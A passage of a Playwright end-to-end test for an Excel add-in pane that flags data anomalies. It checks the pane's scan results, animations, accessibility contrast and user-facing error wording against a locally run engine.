// Browser test of the REAL pane against the REAL engine, with fake-office.js standing in for Excel.
// Run via e2e/all.sh (needs node + playwright with chromium, and the repo's .venv). Modes: flow flow2 ai live nokey.
import { createRequire } from "node:module";
import { fileURLToPath, pathToFileURL } from "node:url";
import fs from "node:fs";
import { trustArgs } from "./trust.mjs";
import { contrastProblems } from "./contrast.mjs";
import path from "node:path";
const pw = await import(process.env.PLAYWRIGHT || "playwright") // local install, else the global one
  .catch(() => import(pathToFileURL(createRequire(import.meta.url).resolve("playwright", { paths: [process.env.NODE_PATH || ""] })).href));
const { chromium } = pw.chromium ? pw : pw.default;
const DIR = fileURLToPath(new URL(".", import.meta.url));
const mode = process.argv[2] || "flow";
const ok = (c, m) => { if (!c) { console.error("FAIL:", m); process.exitCode = 1; } else console.log("ok -", m); };

// 300 sales orders + planted problems: Units -5 (row 11), Units 7777 (row 22: a plain outlier - an all-9s 9999 would be a "missing" code, a basic), a double entry (row 51),
// "east " (row 81), a blank Units (row 121). Row 11 also wears the user's own green fill.
const rows = [["OrderDate", "Region", "Units", "UnitCost", "Total"]];
for (let i = 0; i < 300; i++) { const u = 40 + ((i * 7) % 23), c = 1.99 + (i % 4); rows.push([46028 + i, ["East", "West", "Central"][i % 3], u, c, +(u * c).toFixed(2)]); }
rows[10][2] = -5; rows[21][2] = 7777; rows[50] = [...rows[49]]; rows[80][1] = "east "; rows[120][2] = "";

// Playwright's own Chromium if installed, else the Edge every Windows PC has
const args = trustArgs(DIR);
const browser = await chromium.launch({ args }).catch(() => chromium.launch({ channel: "msedge", args }));
const page = await browser.newPage({ ignoreHTTPSErrors: true, viewport: { width: 360, height: 900 } });
const errors = [];
page.on("pageerror", (e) => errors.push(e.stack));
// a console error names the file that failed: "Failed to load resource: net::ERR_TOO_MANY_RETRIES" came 4 times on
// 23 Oct with no name, under other test runs' load, and never on a quiet rerun (AH-43)
page.on("console", (m) => m.type() === "error" && errors.push(m.location().url ? `${m.text()} (${m.location().url})` : m.text()));
// every unhandled promise rejection and uncaught error, heard by the page itself: window listeners set before any of the
// pane's scripts run (and again after a reload). Each mode must end with none (AH-13)
const unhandled = [];
await page.exposeFunction("__unhandled", (kind, what) => unhandled.push(`${kind}: ${what}`));
await page.addInitScript(() => {
  addEventListener("unhandledrejection", (e) => __unhandled("unhandledrejection", String(e.reason?.stack || e.reason)));
  addEventListener("error", (e) => __unhandled("error", String(e.error?.stack || e.message)));
  // every layout shift since this load, as CLS counts them (none just after a press)
  window.__shift = 0; window.__shifts = []; // and each with its time (AH-228 P-32)
  new PerformanceObserver((l) => { for (const e of l.getEntries()) if (!e.hadRecentInput) window.__shift += e.value, __shifts.push([e.startTime, e.value]); }).observe({ type: "layout-shift", buffered: true });
});
// AH-181: checking as you work is on unless turned off, and the other modes edit cells on purpose to test what a scan and
// a fix do (a sort, a retyped cell): there it is off, so no check of its own adds a /scan call. Mode live turns it on, with
// an AudioContext that counts the tones it is asked to play in place of the speaker
if (mode !== "live") await page.addInitScript(() => localStorage.setItem("anomalyHunterLive", "0"));
else await page.addInitScript(() => {
  window.__tones = 0;
  const node = () => ({ connect: (x) => x, frequency: {}, gain: { setValueAtTime() {}, exponentialRampToValueAtTime() {} }, start() { window.__tones++; }, stop() {} });
  window.AudioContext = class { state = "running"; currentTime = 0; destination = node(); createOscillator() { return node(); } createGain() { return node(); } resume() { return Promise.resolve(); } };
});
// a failure this test causes on purpose: the console lines matching `expected` are its own; anything else still counts
const failing = async (expected, fn) => { const k = errors.length; await fn(); errors.splice(k, Infinity, ...errors.slice(k).filter((e) => !expected.test(e))); };
const DROPPED = /ERR_CONNECTION_RESET|ERR_CONNECTION_REFUSED|ERR_FAILED|Arcas has stopped|status of 50[23]|Ask AI hit a problem|Couldn't save that/;
// the engine's own words for a bug and for an AI failure, where server.log is said in full (AH-124: "Engine error -
// details in server.log" named a file nobody could find). The engine side is held to them by test_api_security.py
const LOG_AT = "%LOCALAPPDATA%\\AnomalyHunter\\server.log";
const BROKE = `The checker hit a problem it didn't expect. Try again, and if it happens again, the details are in ${LOG_AT}.`;
const AI_BROKE = `Ask AI hit a problem it didn't expect. Try again, and if it happens again, the details are in ${LOG_AT}.`;
// AH-135: said as a person with few computer skills can act on it, naming where the file most people have is; the pane
// cannot tell a source folder from the app, so no install.bat aside
const DOWN = "Arcas has stopped. Wait half a minute and try again. If that doesn't work, open your Downloads folder, double-click Arcas.exe, then try again.";
const DOWN_AT_START = "Arcas has stopped. Arcas is trying again by itself. Wait half a minute and press Try again. If that doesn't work, open your Downloads folder, double-click Arcas.exe, then press Try again.";
const dropMidway = async (r) => { await new Promise((go) => setTimeout(go, 300)); await r.abort("connectionreset"); }; // sent, then the engine is gone
const scans = []; // every /scan body the pane sent: the slider's level and the Power BI switch must reach the engine
page.on("request", (r) => r.url().endsWith("/scan") && scans.push(JSON.parse(r.postData())));
// every POST the pane makes, in order ([path, body]), and every /scan answer as the engine sent it: each control must
// call exactly the engine it says it does, and show exactly what the engine answered (AH-11)
const calls = [];
page.on("request", (r) => r.method() === "POST" && calls.push([new URL(r.url()).pathname, JSON.parse(r.postData() || "null")]));
const replies = [];
const profiles = []; // every /profile answer (AH-169)
page.on("response", (r) => r.url().endsWith("/profile") && r.ok() && r.json().then((j) => profiles.push(j), () => {}));
page.on("response", (r) => r.url().endsWith("/scan") && r.ok() && r.json().then((j) => replies.push(j), () => {}));
const since = (k) => calls.slice(k).map((c) => c[0]).join();
// the list shows what the engine's last /scan answered: every row it flagged, with its severity in words and its reason
// in the pane's plain words, and nothing else but rows a person fixed or dismissed before. The reason matters: on this
// sheet strength 0 and 5 flag the same 5 rows at the same severities (only dismissed row 22's reason changes), so a pane
// that skipped its redraw after a slider re-check passed on rows and severities alone (AH-11 breakage pass)
const SEV_WORDS = { High: "Very likely wrong", Medium: "Probably wrong", Low: "Worth a check" };
const matchesEngine = async () => {
  // compare with the answer to the newest /scan: its JSON is read a moment after the pane gets it, and comparing with
  // the one before would pass a pane that never redrew (AH-11 review). Capped: a missing answer fails by name
  for (let t = 0; replies.length < scans.length && t < 200; t++) await page.waitForTimeout(50); // up to 10 s
  if (replies.length !== scans.length) return { ok: false, why: `${scans.length} scans sent, ${replies.length} answers read` };
  const last = replies.at(-1), flagged = new Map();
  last.rows.forEach((r, i) => SEV_WORDS[r.severity] && flagged.set(i + 2, SEV_WORDS[r.severity])); // the header is row 1
  const words = await page.evaluate(async (rs) => { const { plainReason } = await import("./features/scan.js"); return rs.map((r) => plainReason(r.reason)); }, last.rows);
  // a button without "Row N" or a severity fails this check instead of stopping the run
  const shown = await page.$$eval("#flagged-list button", (bs) => bs.map((b) => [+(/^Row (\d+)/.exec(b.innerText) || [])[1], b.querySelector(".sev")?.textContent, b.querySelector(".row-why")?.textContent]));
  const unnamed = shown.filter(([row, tag]) => !Number.isInteger(row) || tag == null);
  if (unnamed.length) return { ok: false, why: "list buttons without a row number or severity: " + JSON.stringify(unnamed) };
  const decided = /^(Fixed|Fix accepted|Dismissed)$/;
  // a fixed or dismissed row shows its decision, but still the engine's newest reason (none: "Looks right now.")
  const wrong = shown.filter(([row, tag, why]) => why !== (words[row - 2] || "Looks right now.") ||
    !(flagged.get(row) === tag || (decided.test(tag) && (flagged.has(row) || tag === "Fixed"))));
  const missing = [...flagged.keys()].filter((row) => !shown.some(([r]) => r === row));
  return { ok: flagged.size > 0 && flagged.size <= 50 && !wrong.length && !missing.length, why: JSON.stringify({ wrong, missing }) };
};
// Power BI's two files, read back like Power BI's own import does (a record ends at every line break). They sit in the
// engine's folder: e2e/cert here, %LOCALAPPDATA%\AnomalyHunter for the installed exe (CI's new-user job sets AH_DATA)
const DATA = process.env.AH_DATA || DIR + "cert", CSV = path.join(DATA, "latest-scan.csv"), FLAGS = path.join(DATA, "latest-flags.csv");
const records = (file) => fs.readFileSync(file, "utf8").replace(/^﻿/, "").split("\r\n").slice(0, -1).map((line) => {
  const out = []; let v = "", q = false;
  for (let k = 0; k < line.length; k++) {
    const ch = line[k];
    if (q) { if (ch === '"' && line[k + 1] === '"') { v += '"'; k++; } else if (ch === '"') q = false; else v += ch; }
    else if (ch === '"') q = true; else if (ch === ",") { out.push(v); v = ""; } else v += ch;
  }
  return [...out, v];
});
await page.route("https://appsforoffice.microsoft.com/**", (r) => r.fulfill({ contentType: "text/javascript", body: fs.readFileSync(DIR + "fake-office.js", "utf8") }));
await page.goto("https://127.0.0.1:5055/taskpane.html");
await page.evaluate((rows) => { __load("Sales", rows, [0]); for (const c of "ABCDE") __fill("Sales", c + "11", "#00B050"); __fill("Sales", "B22", "#00B0F0"); }, rows);
await page.waitForSelector("#main-ui", { state: "visible" });
// AH-169: what the pane says before a scan has had its say (or given up) before any test counts the pane's calls
const profiled = () => page.waitForFunction(() => !document.getElementById("before-scan")?.hasAttribute("data-reading"), null, { timeout: 10000 }).catch(() => {});
await profiled();
// the recorder itself can fail: a planted rejection and a planted throw are both heard, then forgotten
await failing(/e2e recorder probe/, async () => {
  await page.evaluate(() => { Promise.reject(new Error("e2e recorder probe")); setTimeout(() => { throw new Error("e2e recorder probe"); }); });
  await page.waitForTimeout(300);
});
ok(unhandled.length === 2 && unhandled.some((u) => u.startsWith("unhandledrejection")) && unhandled.some((u) => u.startsWith("error")), "the page's recorder hears an unhandled rejection and an uncaught error - " + JSON.stringify(unhandled));
errors.splice(0, Infinity, ...errors.filter((e) => !/e2e recorder probe/.test(e))); unhandled.length = 0;
const text = (sel) => page.textContent(sel);
// AH-184: the finish line over the foot bar, once its growth has ended: shown, how wide (1 = the bar's whole width), and
// out of the flow, so nothing moves when it lands
const line = () => page.evaluate(async () => { const s = document.getElementById("status");
  await Promise.all(s.getAnimations({ subtree: true }).map((a) => a.finished.catch(() => {})));
  const b = getComputedStyle(s, "::before");
  return { shown: b.opacity === "1", wide: b.transform === "none" ? 1 : +(/^matrix\(([^,]+)/.exec(b.transform)?.[1]), out: b.position === "absolute" && b.height === "2px" }; });
// AH-149 review r2: a notice as the pane draws one: at body size, in a hairline box with a square before its first word,
// and said in that one place (never again in the notice line over the results). "Arcas has stopped" was set at 15 px
// with no box under Check words with AI, and as a bare line in the AI help steps, and both read as a heading
const looksLikeNotice = (sel) => page.$eval(sel, (e) => { const c = getComputedStyle(e), b = getComputedStyle(e, "::before"), body = getComputedStyle(document.body).fontSize;
  const m = { size: c.fontSize, body, border: `${c.borderTopWidth} ${c.borderTopStyle}`, square: `${b.content} ${b.width} ${b.height} ${b.backgroundColor}`,
    twice: !!e.textContent && document.getElementById("notice").textContent.includes(e.textContent) };
  return { ...m, ok: m.size === body && m.border === "1px solid" && b.content === '""' && b.width === "10px" && b.height === "10px" && b.backgroundColor !== "rgba(0, 0, 0, 0)" && !m.twice }; });
// AH-94 motion: a transform's scale, and each change of #main-ui's data-scanning (the scan skeleton) with its time
const scaleOf = (m) => +(/^matrix\(([-\d.e]+)/.exec(m) || [0, 1])[1]; // "none" = 1
const watchSkeleton = () => page.evaluate(() => { const m = document.getElementById("main-ui"), first = !window.__sk; window.__sk = [];
  if (first) new MutationObserver(() => __sk.push([performance.now(), m.hasAttribute("data-scanning")])).observe(m, { attributes: true, attributeFilter: ["data-scanning"] }); });
const shown = () => page.evaluate(() => __sk.reduce((t, [at, on], k, a) => (on && a[k + 1] ? t.concat(a[k + 1][0] - at) : t), []));
const shot = async (name) => process.env.SHOTS && page.screenshot({ path: `${process.env.SHOTS}/pane-${name}.png` });
// a mid-motion picture: every clock-driven animation (CSS transitions included) paused at `at` ms, shot, then let go
const midShot = async (name, at, sel) => { if (!process.env.SHOTS) return;
  await page.evaluate(([at, sel]) => (sel ? document.querySelector(sel).getAnimations({ subtree: true }) : document.getAnimations())
    .filter((a) => a.timeline === document.timeline).forEach((a) => { a.pause(); a.currentTime = at; }), [at, sel]);
  await shot(name);
  await page.evaluate(() => document.getAnimations().filter((a) => a.timeline === document.timeline).forEach((a) => a.play())); };
const cell = (a) => page.evaluate((a) => __cell("Sales", a), a);
// an action is over: Find problems is on again, and no action holds the pane (since AH-149 a card's own action turns off
// only the card's buttons, so Find problems alone no longer says it)
const idle = () => page.waitForFunction(() => !document.getElementById("scan").disabled && !__state.working);
// AH-149: the card's angle, read from its computed transform (perspective(1200px) rotateY(a): the matrix's first value is cos a)
const angleOf = (t) => { const m = /^matrix3d\(([-\d.e]+)/.exec(t); return m ? (Math.acos(Math.min(1, +m[1])) * 180) / Math.PI : 0; };
const find = async () => { await page.click("#scan"); await idle(); await page.waitForSelector("#results", { state: "visible" }); };
// WCAG AA as the pane really draws it (AH-87): every text over 4.5:1 (3:1 large) against what lies under it, faded by
// every opacity above it, every text box's edge and placeholder too. Fixed rows were faded to 0.6 (their grey 2.7:1) and
// the boxes framed in a 1.7:1 hairline. The options' sections are opened for the look and closed again as they were
const contrast = async (where) => {
  // the page at rest, as a person reads it: right after a reload the entrance (components/motion.js) still holds the
  // slider at part opacity for up to 1.2 s, and the gate once measured "How hard to look" mid-fade at 3.8:1
  await page.waitForFunction(() => [...document.querySelectorAll("[data-enter]")].every((e) => !e.style.opacity && !e.style.transform), null, { timeout: 5000 });
  // ...and once every clock-driven movement has ended: since AH-149 the rows fade in 30 ms apart and the summary's numbers
  // count up over 700 ms, and the gate read a row mid-fade at 1.9:1
  await page.waitForFunction(() => document.getAnimations().every((a) => a.timeline !== document.timeline || a.playState !== "running"), null, { timeout: 5000 });
  const was = await page.$$eval("#main-ui details", (ds) => ds.map((d) => { const o = d.open; d.open = true; return o; }));
  const bad = await page.evaluate(contrastProblems);
  await page.$$eval("#main-ui details", (ds, was) => ds.forEach((d, k) => (d.open = was[k])), was);
  ok(bad.length === 0, `${where}: every text, box edge and placeholder clears WCAG AA - ` + JSON.stringify(bad));
};
// AH-193: selected text reads on every ground the pane has (paper, the navy bands, the wine button), in the website's
// selection: navy on a light gold. Only a background was set, so the header's cream name selected sat on it at 1.1:1
{ const sel = await page.evaluate(() => {
    const pen = Object.assign(document.createElement("canvas"), { width: 1, height: 1 }).getContext("2d", { willReadFrequently: true });
    const rgb = (s) => { pen.fillStyle = "#fff"; pen.fillRect(0, 0, 1, 1); pen.fillStyle = s; pen.fillRect(0, 0, 1, 1); return [...pen.getImageData(0, 0, 1, 1).data].slice(0, 3); };
    const lum = (c) => c.map((v) => { v /= 255; return v <= 0.04045 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4; }).reduce((t, v, k) => t + v * [0.2126, 0.7152, 0.0722][k], 0);
    return ["header h1", "#pane-footer .pf-tag", "#empty-state p", "#scan"].map((q) => { const s = getComputedStyle(document.querySelector(q), "::selection");
      const [a, b] = [lum(rgb(s.color)), lum(rgb(s.backgroundColor))].sort((x, y) => y - x); return [q, +((a + 0.05) / (b + 0.05)).toFixed(2)]; }); });
  ok(sel.every(([, r]) => r >= 4.5), "AH-193: selected text clears WCAG AA on paper, on the navy bands and on the wine button - " + JSON.stringify(sel)); }
// AH-193: the progress bar fills by scaleX (transform and opacity only move, M1), where it grew by its width
{ const b = await page.evaluate(async () => { const { busy } = await import("./components/progress.js"); busy("probe", 0.5);
    const bar = document.getElementById("busy-bar"); bar.getAnimations().forEach((a) => a.finish());
    const c = getComputedStyle(bar), seen = [c.transform, c.transitionProperty]; busy(""); return seen; });
  ok(scaleOf(b[0]) === 0.5 && b[1] === "transform", "AH-193: half done, the progress bar is drawn at half its width by scaleX - " + JSON.stringify(b)); }
// a person's double-click: two presses on one spot, 150 ms apart, the second counted as the second click (event.detail 2),
// as the OS reports it. Clicked where the button is drawn once the card has settled, as a person aims (AH-127)
const doubleClick = async (sel, gap = 150) => {
  await page.waitForFunction(() => document.getAnimations().every((a) => a.playState !== "running"), null, { timeout: 10000 }).catch(() => {});
  await page.locator(sel).scrollIntoViewIfNeeded();
  const b = await page.locator(sel).boundingBox(), x = b.x + b.width / 2, y = b.y + b.height / 2;
  await page.mouse.move(x, y);
  await page.mouse.down({ clickCount: 1 }); await page.mouse.up({ clickCount: 1 });
  await page.waitForTimeout(gap);
  await page.mouse.down({ clickCount: 2 }); await page.mouse.up({ clickCount: 2 });
};
// Back to the list. Since AH-149 the list comes back inside a view transition, drawn a frame or two after the press:
// wait for it, as a person sees it, before reading it
const back = async () => { await page.click("#fix-back"); await page.waitForSelector("#results", { state: "visible" }); };
// every frame for a while, whether a view transition is running (AH-149), and a wait for one to have run and ended
const watchVt = () => page.evaluate(() => { window.__vt = []; const f = () => { __vt.push(document.getAnimations().some((a) => String(a.effect?.pseudoElement).startsWith("::view-transition"))); if (__vt.length < 90) requestAnimationFrame(f); }; requestAnimationFrame(f); });
const vtDone = async () => { await page.waitForFunction(() => __vt.some(Boolean), null, { timeout: 3000 }).catch(() => {});
  await page.waitForFunction(() => document.getAnimations().every((a) => a.playState !== "running"), null, { timeout: 5000 }).catch(() => {}); };
const openLevel = () => page.$eval("#strength-box", (d) => (d.open = true)); // since AH-175 the slider is folded
const openRow = async (r) => { await page.click(`#flagged-list button:has-text("Row ${r} ")`); await idle(); await page.waitForFunction(() => document.getElementById("fix-changes").children.length || document.getElementById("fix-explanation").textContent); };

if (mode === "flow") {
  // 1) one click, no stop at a limits table; buttons are off while it works, so nothing queues silently
  const c0 = calls.length;
  await watchSkeleton();
  // AH-149: every frame from the click on, where the first result row is once it has appeared, and the rows' arrival
  await page.evaluate(() => { window.__tops = []; window.__arrive = null;
    const f = () => { const b = document.querySelector("#flagged-list button"); if (b?.checkVisibility()) __tops.push(b.getBoundingClientRect().top); if (!window.__stopTops) requestAnimationFrame(f); };
    requestAnimationFrame(f);
    window.__slow = 150; // an Excel that takes its time, so every step of the scan gets frames of its own
    new MutationObserver((_, mo) => { mo.disconnect(); window.__landAt = performance.now(); __arrive = [...document.getElementById("flagged-list").children].slice(0, 12).map((li) => li.getAnimations().map((a) => [a.effect.getTiming().delay, Object.keys(a.effect.getKeyframes()[0]).filter((k) => !["offset", "easing", "composite", "computedOffset"].includes(k))])); })
      .observe(document.getElementById("flagged-list"), { childList: true }); });
  // AH-149 review: every frame the summary counts, its words as drawn (a counting number is its counter's --n) and how wide
  // each drawn number is beside the number it becomes. The total was counted too and drew "0 of     0 rows look wrong."
  await page.evaluate(() => { window.__counted = [];
    const f = () => { const s = document.getElementById("summary");
      if (s?.querySelector(".counting")) {
        const probe = (t) => { const p = s.appendChild(Object.assign(document.createElement("span"), { textContent: t })); const w = p.getBoundingClientRect().width; p.remove(); return w; };
        const nums = [...s.querySelectorAll(".count.counting")].map((c) => [getComputedStyle(c).getPropertyValue("--n").trim(), c.getBoundingClientRect().width]);
        __counted.push({ drawn: [...s.childNodes].map((n) => (n.classList?.contains("counting") ? getComputedStyle(n).getPropertyValue("--n").trim() : n.textContent)).join(""),
          wider: nums.filter(([v, w]) => probe(v) > w + 0.5).map(([v, w]) => `${v} in ${w.toFixed(1)}`) });
      }
      if (__counted.length < 200 && !window.__stopTops) requestAnimationFrame(f); };
    requestAnimationFrame(f); });
  const atRest = await page.evaluate(() => getComputedStyle(document.getElementById("scan")).backgroundColor); // before any scan
  await page.click("#scan");
  await page.mouse.move(0, 0); // off the button, so its at-rest colour is the one to compare once the scan is over
  ok(await page.evaluate(() => document.getElementById("clear-highlights").disabled), "buttons are disabled while it works");
  // AH-94: from the click until the results render, the scan skeleton stands where they land (in place of the empty
  // state on a first scan), its rows built like a list row; a Find problems scan keeps it at least ~450 ms
  // (read null-safe: a pane without a skeleton fails these checks by name instead of stopping the run)
  const sk = await page.evaluate(() => { const s = document.getElementById("scan-skeleton"), r = s?.querySelector(".flagged-list .row-box")?.getBoundingClientRect();
    return { on: !!s && s.offsetParent !== null, empty: document.getElementById("empty-state").offsetParent !== null, rows: s?.querySelectorAll(".flagged-list .row-box").length,
      light: s && getComputedStyle(s, "::after").animationName, passes: s && getComputedStyle(s, "::after").animationIterationCount,
      sliver: getComputedStyle(document.getElementById("busy-bar")).animationIterationCount, box: r ? [r.left, r.width, r.height] : [NaN, NaN, NaN] }; });
  ok(sk.on && !sk.empty && sk.rows === 5 && sk.light === "sk-pass", "the scan skeleton shows at once, in place of the empty state, 5 rows and one passing light - " + JSON.stringify(sk));
  ok(+sk.passes > 0 && +sk.passes < 100 && /^\d+$/.test(sk.passes) && /^\d+$/.test(sk.sliver), "AH-149: the skeleton's light and the progress sliver pass a set number of times, never forever - " + JSON.stringify([sk.passes, sk.sliver]));
  await shot("skeleton");
  // AH-149 review r2: the first frame Find problems is on again, the results shown and nothing running, it is drawn in its
  // full colour, as before any scan: it faded back from its off colour over .3 s, and the pictures caught it mauve
  { const on = await (await page.waitForFunction(() => { const s = document.getElementById("scan");
      return !s.disabled && !__state.working && { bg: getComputedStyle(s).backgroundColor, results: document.getElementById("results").checkVisibility(), mark: getComputedStyle(s, "::after").content }; })).jsonValue();
    ok(on.results && on.bg === atRest, `AH-149 review r2: once the results are in and nothing runs, Find problems is on and in its full colour at once - ${on.bg} (before any scan ${atRest})`);
    ok(on.mark === "none", "AH-149 review r2: no white square in Find problems (it read as a Stop icon) - " + on.mark); }
  // AH-166: Find problems keeps its wine under the pointer: its hover was navy, and after a scan the pointer still on it
  // showed a navy button (John). A darker wine now, drawn through a canvas to plain RGB; a press stays navy and ringed.
  // AH-193: the hover's colour is a layer drawn across by scaleX, as the website's buttons: read on that layer, fully drawn
  { const rgb = (c) => page.evaluate((c) => { const x = Object.assign(document.createElement("canvas"), { width: 1, height: 1 }).getContext("2d");
      x.fillStyle = c; x.fillRect(0, 0, 1, 1); return [...x.getImageData(0, 0, 1, 1).data].slice(0, 3); }, c);
    await idle(); await page.hover("#scan"); await page.waitForTimeout(500);
    const hover = await page.evaluate(() => { const l = getComputedStyle(document.getElementById("scan"), "::before");
      return l.content === "none" ? "no layer" : /^(none|matrix\(1, 0, 0, 1, 0, 0\))$/.test(l.transform) ? l.backgroundColor : "half drawn " + l.transform; });
    await page.mouse.move(0, 0); await page.waitForTimeout(500);
    const [h, w] = [await rgb(hover), await rgb(atRest)], light = (c) => c[0] + c[1] + c[2];
    ok(h[0] > h[1] && h[0] > h[2] && light(h) < light(w) && h.join() !== w.join(), `AH-166: hovered, Find problems is a darker wine, never navy - ${hover} ${h} (at rest ${w})`); }
  ok(!(await page.isVisible("#legend")) && (await page.$$("#legend li")).length === 0, "AH-166: with one severity listed, no legend repeats the summary - " + (await text("#legend")));
  await idle();
  ok(await page.isVisible("#results"), "results after ONE click");
  // the skeleton's row stands for a row's head and the first two lines of its reason: since AH-163 a longer reason shows
  // whole and grows the row below them, so the real row is measured to its reason's second line
  { const box = await page.evaluate(() => { const b = document.querySelector("#flagged-list button"), r = b.getBoundingClientRect(), w = b.querySelector(".row-why"), range = document.createRange();
      range.selectNodeContents(w); const lines = [...new Set([...range.getClientRects()].map((k) => Math.round(k.bottom)))].sort((x, y) => x - y);
      return [r.left, r.width, Math.min(r.height, lines[Math.min(1, lines.length - 1)] + parseFloat(getComputedStyle(b).paddingBottom) - r.top)]; });
    const gone = await page.evaluate(() => document.getElementById("scan-skeleton")?.offsetParent === null && !document.getElementById("main-ui").hasAttribute("data-scanning"));
    const held = await shown();
    ok(gone && Math.abs(box[0] - sk.box[0]) < 0.5 && Math.abs(box[1] - sk.box[1]) < 0.5 && Math.abs(box[2] - sk.box[2]) <= 3 && held.length === 1 && held[0] >= 440,
      `the skeleton goes when the results land, its first row where the real first row is (skeleton ${sk.box.map(Math.round)}, real ${box.map(Math.round)}), shown ${held.map(Math.round)} ms`); }
  await shot("landed");
  // AH-163: every row's whole reason shows in the list, its last word drawn inside its row: a two-line clamp cut a
  // reason's second sentence ("Units is ...") to "..." (John, the pane at 360 px). At 320 px too
  const whole = () => page.$$eval("#flagged-list .row-why", (ws) => ws.map((w) => { const r = document.createRange(), t = w.firstChild;
    r.setStart(t, t.length - 1); r.setEnd(t, t.length); const end = [...r.getClientRects()].at(-1), box = w.getBoundingClientRect();
    return { text: w.textContent, lines: w.textContent.split("\n").length, clipped: w.scrollHeight - w.clientHeight, under: end ? end.bottom - box.bottom : Infinity }; }));
  for (const width of [360, 320]) {
    await page.setViewportSize({ width, height: 900 }); await page.waitForTimeout(100);
    const ws = await whole(), cut = ws.filter((w) => w.clipped > 1 || w.under > 1);
    ok(ws.length >= 5 && !cut.length && ws.some((w) => w.lines >= 2), `AH-163: at ${width} px every row's whole reason shows in the list, a two-sentence one on two lines and more - ` + JSON.stringify(cut.length ? cut : ws.map((w) => w.text)));
  }
  await page.setViewportSize({ width: 360, height: 900 });
  await page.waitForTimeout(1000); // room for a second, unwanted scan to show up, as the slider checks give it
  { const tops = await page.evaluate(() => { window.__stopTops = true; window.__slow = 0; return __tops; });
    ok(tops.length > 10 && Math.max(...tops) - Math.min(...tops) < 0.5, `AH-149: from Find problems to 1 s after the results land, the first row never moves once it is there (the progress line and "Done" take turns in one held space) - ${tops.length} frames, tops ${Math.min(...tops).toFixed(1)} to ${Math.max(...tops).toFixed(1)}`); }
  { const arrive = await page.evaluate(() => __arrive);
    const delays = arrive?.map((a) => a[0]?.[0]);
    ok(arrive && arrive.every((a) => a.length === 1 && a[0][1].join() === "opacity") && delays.join() === [0, 30, 60, 90, 120, 150, 180, 210, 240, 240, 240, 240].slice(0, delays.length).join() && delays.length >= 5,
      "AH-149: the rows arrive 30 ms apart from the first at once, by opacity only, eight steps at most - " + JSON.stringify(arrive)); }
  { const tn = await page.evaluate(() => ["#flagged-list .row-head", "#summary", "#list-title", "#fix-title", "#busy-line", "#scan", "#clear-highlights"].map((q) => [q, document.querySelector(q) ? getComputedStyle(document.querySelector(q)).fontVariantNumeric : "missing"]));
    ok(tn.every(([, v]) => v.includes("tabular-nums")), "AH-149: every number that changes or lines up is in figures of one width - " + JSON.stringify(tn)); }
  { const count = await page.evaluate(() => [...document.querySelectorAll("#summary .count")].map((c) => c.textContent));
    ok(count.join() === "5", "AH-149: the summary's flagged number is its own, to count up, and its text is the result all along - " + count);
    const frames = await page.evaluate(() => __counted);
    const said = await page.evaluate(() => document.getElementById("summary").textContent.trim());
    ok(frames.length === 0 && said.startsWith("5 of 300 rows look wrong."),
      `AH-149 review r1: a flagged number under 10 is drawn as itself from the first frame, never counted from 0 ("0 of 300 rows look wrong." above 5 flagged rows) - ${frames.length} counting frames, ${JSON.stringify(frames.slice(0, 3))}, "${said}"`); }
  { const h = await page.evaluate(() => ({ hint: document.getElementById("strength-hint").textContent, tested: document.getElementById("strength-measured")?.textContent,
      open: document.getElementById("strength-tested")?.open, summary: document.querySelector("#strength-tested summary")?.textContent })); // null-safe: a pane without them fails by name
    ok(h.hint === "Recommended. The basics, numbers outside their column's usual range, sudden jumps over time, and unusual mixes of values across columns." && !h.open && h.summary === "How we tested this level"
      && /^We tested it on \d+ practice sheets with \d+ mistakes hidden in them\. It found .* rows that were fine/.test(h.tested),
      "AH-149 review: under the slider, what the level does in one short line; what it did on the bench under \"How we tested this level\", closed - " + JSON.stringify(h)); }
  // AH-175: on first use the slider is folded under Find problems, its summary saying the level, and a press opens it
  { const fold = () => page.evaluate(() => ({ open: document.getElementById("strength-box").open, summary: document.querySelector("#strength-box > summary").textContent,
      slider: document.getElementById("strength").checkVisibility(), hint: document.getElementById("strength-hint").checkVisibility() }));
    const closed = await fold(); await page.click("#strength-box > summary"); const opened = await fold(); await page.click("#strength-box > summary");
    ok(!closed.open && closed.summary === "How hard to look: 5 of 10" && !closed.slider && !closed.hint && opened.open && opened.slider && opened.hint,
      "AH-175: the slider is folded, closed, under \"How hard to look: 5 of 10\", and a press opens it - " + JSON.stringify({ closed, opened })); }
  ok((await page.getAttribute("#strength", "aria-valuetext")) === "5 of 10, Recommended", "AH-149: the slider tells a screen reader its level's word - " + (await page.getAttribute("#strength", "aria-valuetext")));
  ok(since(c0) === "/scan" && calls[c0][1].strength === 5 && calls[c0][1].power_bi === false, "Find problems sends exactly one /scan, at the slider's level - " + since(c0));
  { const m = await matchesEngine(); ok(m.ok, "the list is exactly what the engine answered: each flagged row, its severity in words and its reason - " + m.why); }
  ok((await text("#summary")).startsWith("5 of 300 rows look wrong."), "summary in plain words - " + (await text("#summary")));
  // AH-228 P-32 (was "Done in N seconds." in the notice box over the results): said in the summary's own line, and the
  // rows start higher: the progress's space is let go as the list is drawn (step 3 says its progress in the foot bar), so
  // the list lands where it stays and nothing moves after (fix round 1: the empty 57 px band stayed over the results)
  { const end = await page.evaluate(() => { const st = document.getElementById("status");
      return { notice: document.getElementById("notice").textContent, summary: document.getElementById("summary").textContent,
        gap: Math.round(document.getElementById("results").getBoundingClientRect().top - document.querySelector(".pane-hero").getBoundingClientRect().bottom),
        inFlow: getComputedStyle(st).position !== "fixed" ? st.getBoundingClientRect().height : 0,
        // shifts past the frames the list lands in: the results taking the skeleton's place is the landing itself
        shift: __shifts.filter(([t]) => t > __landAt + 100).reduce((k, [, v]) => k + v, 0), landing: __shifts.filter(([t]) => t > __landAt - 50 && t <= __landAt + 100).map(([t, v]) => [Math.round(t - __landAt), v]) }; });
    ok(end.notice === "" && /^5 of 300 rows look wrong\..* Checked in \d+ seconds?\.$/.test(end.summary) && end.inFlow < 1 && end.gap < 40 && end.shift === 0,
      "AH-228 P-32: how long it took is said in the summary's line, no band over the results, nothing moved after they landed - " + JSON.stringify(end)); }
  { const l = await line(); ok(!l.shown, "AH-184: no finish line before the first decision - " + JSON.stringify(l)); }
  // AH-228 fix round 1: how long it took is a quiet fact after the finding, never as loud as it; and a short list has no
  // kind buttons over it, so its first row comes up (7 full-width buttons put it at about 1,000 px)
  { const m = await page.evaluate(() => { const t = document.querySelector("#summary .summary-time"), c = t && getComputedStyle(t), row = document.querySelector("#flagged-list li[data-i]");
